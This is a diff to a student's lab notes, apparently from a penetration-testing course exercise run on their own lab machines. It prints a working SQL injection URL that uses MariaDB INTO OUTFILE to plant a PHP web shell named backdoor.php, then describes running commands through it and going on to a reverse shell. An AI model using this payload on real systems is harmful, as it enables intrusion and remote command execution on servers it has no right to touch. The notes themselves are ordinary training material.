@@ -162,6 +162,8 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 1.  Exploit the SQL injection along with the MariaDB INTO OUTFILE function to obtain code execution.
 To do this we simply need to append the end of our sql injection url, adding the creation of a malicious php file.
 `http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
-
+This creates the new endpoint "backdoor.php" which allows us to specify a command to run via the arguement "cmd=". Here, we are running the ipconfig command.
+![[Pasted image 20220620174054.png]]
 
 2.  Turn the simple code execution into a full shell.
+To gain a shell we can replace our previous ipconfig command with a reverse shell.
